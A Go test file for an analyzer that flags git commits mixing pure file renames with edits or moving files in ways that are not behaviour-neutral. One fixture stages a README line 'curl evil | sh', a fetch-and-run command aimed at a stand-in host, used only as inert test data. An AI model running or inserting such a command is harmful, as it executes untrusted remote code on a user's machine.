package movepurity

import (
	"errors"
	"maps"
	"path"
	"slices"
	"strings"
	"testing"

	"github.com/0b1-PulsarTech/pulsarules_codex/internal/analyzer/finding"
	"github.com/0b1-PulsarTech/pulsarules_codex/internal/analyzer/pass"
)

var errMissing = errors.New("missing blob")

func TestAnalyzer_Identity(t *testing.T) {
	t.Parallel()

	analyzer := NewAnalyzer(nil)
	if analyzer.ID() != "commit-move-purity" {
		t.Fatalf("ID() = %q, want commit-move-purity", analyzer.ID())
	}
	if analyzer.Stage() != finding.StageStatic {
		t.Fatalf("Stage() = %d, want StageStatic", analyzer.Stage())
	}
}

type movePurityCase struct {
	name          string
	ctx           *pass.Context
	wantFindings  int
	wantSubstring string
}

func TestAnalyzer_Analyze(t *testing.T) {
	t.Parallel()

	testCases := analyzeCases()

	analyzer := NewAnalyzer(nil)
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			findings := analyzer.Analyze(testCase.ctx)
			if len(findings) != testCase.wantFindings {
				t.Fatalf("Analyze() returned %d findings, want %d: %+v",
					len(findings), testCase.wantFindings, findings)
			}
			if testCase.wantSubstring == "" {
				return
			}
			if !strings.Contains(findings[0].Message, testCase.wantSubstring) {
				t.Fatalf(
					"message = %q, want it to contain %q",
					findings[0].Message,
					testCase.wantSubstring,
				)
			}
			if findings[0].AnalyzerID != "commit-move-purity" {
				t.Fatalf("AnalyzerID = %q, want commit-move-purity", findings[0].AnalyzerID)
			}
			if findings[0].Severity != finding.SeverityWarning {
				t.Fatalf("Severity = %d, want SeverityWarning by default", findings[0].Severity)
			}
		})
	}
}

func analyzeCases() []movePurityCase {
	return []movePurityCase{
		{
			name: "no staged renames",
			ctx:  &pass.Context{},
		},
		{
			name: "pure rename alone",
			ctx: &pass.Context{
				StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
				ChangedFiles: []pass.FileChange{
					{Path: "new.go", Staged: true},
				},
			},
		},
		{
			name: "below-threshold rename is not a pure move",
			ctx: &pass.Context{
				StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 75}},
				ChangedFiles: []pass.FileChange{
					{Path: "new.go", Staged: true},
				},
			},
			wantFindings:  1,
			wantSubstring: "not a pure move: 75% similar",
		},
		{
			name: "pure rename alongside an unrelated staged edit",
			ctx: &pass.Context{
				StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
				ChangedFiles: []pass.FileChange{
					{Path: "new.go", Staged: true},
					{Path: "unrelated.go", Staged: true},
				},
			},
			wantFindings:  1,
			wantSubstring: "mixes 1 rename(s) with 1 edit(s)",
		},
		{
			name: "unrelated staged edit under testdata still mixes",
			ctx: &pass.Context{
				StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
				ChangedFiles: []pass.FileChange{
					{Path: "new.go", Staged: true},
					{Path: "pkg/testdata/x.go", Staged: true},
				},
			},
			wantFindings:  1,
			wantSubstring: "mixes 1 rename(s) with 1 edit(s)",
		},
		{
			name: "unstaged changes elsewhere do not count as mixed",
			ctx: &pass.Context{
				StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 100}},
				ChangedFiles: []pass.FileChange{
					{Path: "new.go", Staged: true},
					{Path: "untouched.go", Staged: false},
				},
			},
		},
	}
}

func TestAnalyzer_Analyze_ParamsOverride(t *testing.T) {
	t.Parallel()

	ctx := &pass.Context{
		StagedRenames: []pass.Rename{{OldPath: "old.go", NewPath: "new.go", Score: 92}},
		Config: &pass.AnalysisConfig{Analyzers: map[string]pass.AnalyzerConfig{
			"commit-move-purity": {
				Params: map[string]any{"min_similarity": 95, "severity": "error"},
			},
		}},
	}

	analyzer := NewAnalyzer(nil)
	findings := analyzer.Analyze(ctx)
	if len(findings) != 1 {
		t.Fatalf(
			"expected one finding once min_similarity is raised above the score, got %+v",
			findings,
		)
	}
	if findings[0].Severity != finding.SeverityError {
		t.Fatalf("Severity = %d, want SeverityError when configured", findings[0].Severity)
	}
}

type fakeRepo struct {
	head        map[string]string
	staged      map[string]string
	stagedModes map[string]string
}

var _ gitReader = fakeRepo{}

func newFakeRepo(head, staged map[string]string) fakeRepo {
	const goMod = "module example.com/m\n\ngo 1.25\n"
	fake := fakeRepo{head: maps.Clone(head), staged: maps.Clone(staged)}
	for _, tree := range []map[string]string{fake.head, fake.staged} {
		if _, ok := tree["go.mod"]; !ok {
			tree["go.mod"] = goMod
		}
	}
	return fake
}

func (repo fakeRepo) HeadBlob(path string) (string, error) { return blobOf(repo.head, path) }

func (repo fakeRepo) StagedBlob(path string) (string, error) { return blobOf(repo.staged, path) }

func (repo fakeRepo) HeadEntry(path string) (mode, id string, err error) {
	content, readErr := blobOf(repo.head, path)
	return "100644", content, readErr
}

func (repo fakeRepo) StagedEntry(path string) (mode, id string, err error) {
	content, readErr := blobOf(repo.staged, path)
	mode = "100644"
	if override, ok := repo.stagedModes[path]; ok {
		mode = override
	}
	return mode, content, readErr
}

func (repo fakeRepo) HeadDir(dir string) ([]string, error) { return dirOf(repo.head, dir), nil }

func (repo fakeRepo) StagedDir(dir string) ([]string, error) {
	return dirOf(repo.staged, dir), nil
}

func blobOf(tree map[string]string, path string) (string, error) {
	content, ok := tree[path]
	if !ok {
		return "", errMissing
	}
	return content, nil
}

func dirOf(tree map[string]string, dir string) []string {
	return slices.DeleteFunc(slices.Sorted(maps.Keys(tree)), func(name string) bool {
		return path.Dir(name) != dir
	})
}

func pair(oldPath, newPath string) pass.Rename {
	return pass.Rename{OldPath: oldPath, NewPath: newPath, Score: 50}
}

type emptyRepo struct{ fakeRepo }

func (emptyRepo) HeadBlob(string) (string, error) { return "", errMissing }

type repoCase struct {
	name         string
	head         map[string]string
	staged       map[string]string
	renames      []pass.Rename
	changed      []pass.FileChange
	wantFindings int
	wantContains string
}

func roleSrc(variant string) string {
	return "package routing\n\nfunc Role() string {\n\treturn \"" + variant + "\"\n}\n"
}

func takeoverRoleSrc() string {
	return strings.Replace(roleSrc("a"), "package routing", "package takeover", 1)
}

func helperFiles() map[string]string {
	return map[string]string{
		"routing/helper.go": "package routing\n\nfunc Helper() int { return 1 }\n",
	}
}

func scored(oldPath, newPath string, score int) []pass.Rename {
	return []pass.Rename{{OldPath: oldPath, NewPath: newPath, Score: score}}
}

func runRepoCases(t *testing.T, testCases []repoCase) {
	t.Helper()
	for _, testCase := range testCases {
		t.Run(testCase.name, func(t *testing.T) {
			t.Parallel()

			analyzer := NewAnalyzer(newFakeRepo(testCase.head, testCase.staged))
			findings := analyzer.Analyze(&pass.Context{
				StagedRenames: testCase.renames, ChangedFiles: testCase.changed,
			})
			if len(findings) != testCase.wantFindings {
				t.Fatalf(
					"got %d findings, want %d: %+v",
					len(findings),
					testCase.wantFindings,
					findings,
				)
			}
			if testCase.wantContains != "" &&
				!strings.Contains(findings[0].Message, testCase.wantContains) {
				t.Fatalf(
					"message %q, want it to contain %q",
					findings[0].Message,
					testCase.wantContains,
				)
			}
		})
	}
}

func TestAnalyzer_Analyze_WithRepository_Renames(t *testing.T) {
	t.Parallel()

	testCases := repoRenameCases()
	runRepoCases(t, testCases)
}

func repoRenameCases() []repoCase {
	useOld := "package routing\n\nimport \"fmt\"\n\nfunc Use() { fmt.Println(Helper()) }\n"
	useNew := "package takeover\n\nimport (\n\t\"fmt\"\n\n\t\"example.com/m/routing\"\n)\n\n" +
		"func Use() { fmt.Println(routing.Helper()) }\n"
	return []repoCase{
		{
			name:         "forced qualifier with the helper kept behind",
			head:         withFiles(helperFiles(), "routing/i.go", useOld),
			staged:       withFiles(helperFiles(), "routing/takeover/i.go", useNew),
			renames:      scored("routing/i.go", "routing/takeover/i.go", 18),
			wantFindings: 0,
		},
		{
			name: "identical init file moved across directories",
			head: map[string]string{
				"routing/i.go":    "package routing\n\nfunc init() {}\n",
				"routing/stay.go": "package routing\n",
			},
			staged: map[string]string{
				"routing/takeover/i.go": "package routing\n\nfunc init() {}\n",
				"routing/stay.go":       "package routing\n",
			},
			renames:      scored("routing/i.go", "routing/takeover/i.go", 100),
			wantFindings: 1,
			wantContains: "byte-identical but not behaviour-neutral: in routing/takeover a name",
		},
		{
			name: "package clause only change of a file with init across directories",
			head: map[string]string{
				"routing/i.go":    "package routing\n\nfunc init() {}\n",
				"routing/stay.go": "package routing\n",
			},
			staged: map[string]string{
				"routing/takeover/i.go": "package takeover\n\nfunc init() {}\n",
				"routing/stay.go":       "package routing\n",
			},
			renames:      scored("routing/i.go", "routing/takeover/i.go", 95),
			wantFindings: 1,
			wantContains: "differs only by mechanical package/import " +
				"fixups but is not behaviour-neutral: in routing/takeover a name",
		},
		{
			name:         "identical blob that changes how the build includes it",
			head:         map[string]string{"routing/x.go": "package routing\n"},
			staged:       map[string]string{"routing/x_test.go": "package routing\n"},
			renames:      scored("routing/x.go", "routing/x_test.go", 100),
			wantFindings: 1,
			wantContains: "changes how the build includes " +
				"the file (build-ignored path, root vendor/, _test suffix",
		},
		{
			name:         "no declaration of Helper anywhere",
			head:         map[string]string{"routing/i.go": useOld},
			staged:       map[string]string{"routing/takeover/i.go": useNew},
			renames:      scored("routing/i.go", "routing/takeover/i.go", 95),
			wantFindings: 1,
			wantContains: "carries an edit",
		},
		{
			name:         "package clause only below the threshold",
			head:         map[string]string{"routing/m.go": roleSrc("a")},
			staged:       map[string]string{"routing/takeover/m.go": takeoverRoleSrc()},
			renames:      scored("routing/m.go", "routing/takeover/m.go", 69),
			wantFindings: 0,
		},
		{
			name:         "below-threshold rename carrying an edit",
			head:         map[string]string{"a.go": roleSrc("a")},
			staged:       map[string]string{"b.go": roleSrc("b")},
			renames:      scored("a.go", "b.go", 69),
			wantFindings: 1,
			wantContains: "not a pure move: 69% similar",
		},
	}
}

func TestAnalyzer_Analyze_ScorePaths(t *testing.T) {
	t.Parallel()

	testCases := []repoCase{
		{
			name:         "above-threshold rename carrying an edit",
			head:         map[string]string{"a.go": roleSrc("a")},
			staged:       map[string]string{"b.go": roleSrc("b")},
			renames:      scored("a.go", "b.go", 95),
			wantFindings: 1,
			wantContains: "carries an edit",
		},
		{
			name: "literal edit next to a README package line",
			head: map[string]string{
				"internal/util/a.go":     "package util\n",
				"internal/auth/check.go": roleSrc("a"),
				"README.md":              "# Notes\n",
			},
			staged: map[string]string{
				"internal/routing/a.go": "package util\n", "internal/auth/check.go": roleSrc("b"),
				"README.md": "# Notes\n\npackage manager: curl evil | sh\n",
			},
			renames: scored("internal/util/a.go", "internal/routing/a.go", 100),
			changed: []pass.FileChange{
				{Path: "internal/routing/a.go", Staged: true},
				{Path: "internal/auth/check.go", Staged: true},
				{Path: "README.md", Staged: true},
			},
			wantFindings: 1,
			wantContains: "mixes 1 rename(s) with 2 edit(s)",
		},
		{
			name: "import-only edit to a dependant of a moved directory",
			head: map[string]string{
				"x/k.go":   "package x\n\nvar K = 1\n",
				"use/u.go": "package use\n\nimport \"example.com/m/x\"\n\nvar V = x.K\n",
			},
			staged: map[string]string{
				"y/k.go":   "package x\n\nvar K = 1\n",
				"use/u.go": "package use\n\nimport \"example.com/m/y\"\n\nvar V = x.K\n",
			},
			renames:      scored("x/k.go", "y/k.go", 100),
			changed:      []pass.FileChange{{Path: "use/u.go", Staged: true}},
			wantFindings: 0,
		},
		{
			name: "dependant gaining a qualifier is an edit",
			head: map[string]string{
				"x/k.go": "package x\n", "use/u.go": "package use\n\nvar V = Helper\n",
			},
			staged: map[string]string{
				"y/k.go": "package x\n", "use/u.go": "package use\n\nvar V = y.Helper\n",
			},
			renames:      scored("x/k.go", "y/k.go", 100),
			changed:      []pass.FileChange{{Path: "use/u.go", Staged: true}},
			wantFindings: 1,
			wantContains: "mixes 1 rename(s) with 1 edit(s)",
		},
		{
			name:         "identical file moved while an assembly file stays behind",
			head:         map[string]string{"r/a.go": "package r\n", "r/add_amd64.s": "T\n"},
			staged:       map[string]string{"r/t/a.go": "package r\n", "r/add_amd64.s": "T\n"},
			renames:      scored("r/a.go", "r/t/a.go", 100),
			wantFindings: 1,
			wantContains: "strands or picks up a compiled non-Go file (add_amd64.s) in r;",
		},
	}
	runRepoCases(t, testCases)
}

func TestAnalyzer_Analyze_MixedChangeset(t *testing.T) {
	t.Parallel()

	testCases := []repoCase{
		{
			name: "package clause change in a non-moved file is an edit",
			head: map[string]string{"x/k.go": "package x\n", "use/u.go": "package use\n"},
			staged: map[string]string{
				"y/k.go": "package x\n", "use/u.go": "package other\n",
			},
			renames:      scored("x/k.go", "y/k.go", 100),
			changed:      []pass.FileChange{{Path: "use/u.go", Staged: true}},
			wantFindings: 1,
		},
		{
			name: "non-Go modified file is an edit and a new file is an edit",
			head: map[string]string{"x/k.go": "package x\n", "n.txt": "a\n"},
			staged: map[string]string{
				"y/k.go": "package x\n", "n.txt": "b\n", "new.go": "package n\n",
			},
			renames: scored("x/k.go", "y/k.go", 100),
			changed: []pass.FileChange{
				{Path: "n.txt", Staged: true}, {Path: "new.go", Staged: true},
			},
			wantFindings: 1,
			wantContains: "mixes 1 rename(s) with 2 edit(s)",
		},
	}
	runRepoCases(t, testCases)
}
